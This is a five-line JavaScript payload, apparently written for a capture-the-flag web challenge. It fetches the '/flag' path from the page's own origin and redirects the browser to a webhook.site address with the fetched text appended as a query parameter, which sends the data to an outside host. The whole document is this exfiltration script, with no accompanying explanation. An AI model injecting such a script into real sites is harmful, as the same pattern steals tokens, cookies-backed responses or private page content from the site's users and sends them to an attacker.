fetch('/flag')
  .then(r => r.text())
  .then(flag => {
    location.href = 'https://webhook.site/c68e80c2-5c60-46d0-ace5-00dc5ec9957c?flag=' + encodeURIComponent(flag);
  });
